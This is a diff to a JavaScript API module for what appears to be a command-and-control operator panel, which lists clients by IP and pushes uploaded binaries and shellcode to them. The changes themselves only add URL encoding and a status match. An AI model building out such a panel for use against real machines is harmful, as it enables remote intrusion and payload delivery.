@@ -23,14 +23,14 @@ export const apiService = {
 
     // Retrieves detailed information about a specific client by IP
     async getClientInfo(clientIP) {
-        const result = await fetch(`${API_BASE}/get-client-info?client=${clientIP}`);
+        const result = await fetch(`${API_BASE}/get-client-info?client=${encodeURIComponent(clientIP)}`);
         return await result.json();
     },
 
     // Retrieves messages for a specific client by IP
     async getClientMessages(clientIP) {
         // NOTE: fetches the messages appended to client.Messages buffer in message_protocol::processClientMessage()
-        const result = await fetch(`${API_BASE}/get-client-messages?client=${clientIP}`); 
+        const result = await fetch(`${API_BASE}/get-client-messages?client=${encodeURIComponent(clientIP)}`);
         return await result.json();
     },
 
@@ -61,7 +61,7 @@ export const apiService = {
         const formData = new FormData();
         formData.append('client', client);
         formData.append('binaryFile', file); // attach file to form data
-        
+
         // POST request with form data (multipart/form-data)
         const result = await fetch(`${API_BASE}/send-binary`, {
             method: 'POST',
@@ -75,7 +75,7 @@ export const apiService = {
         const formData = new FormData();
         formData.append('client', client);
         formData.append('shellcodeFile', file); // attach shellcode file
-        
+
         const result = await fetch(`${API_BASE}/send-shellcode`, {
             method: 'POST',
             body: formData
@@ -104,7 +104,7 @@ export const utils = {
         if (!status) return ''; // empty status
         if (status.includes('✅') || status.includes('Listener started')) return 'success';
         if (status.includes('❌') || status.includes('Error')) return 'error';
-        if (status.includes('⚠️') || status.includes('DANGER')) return 'warning';
+        if (status.includes('Warning:') || status.includes('⚠️') || status.includes('DANGER')) return 'warning';
         return ''; // default if none match
     }
 };
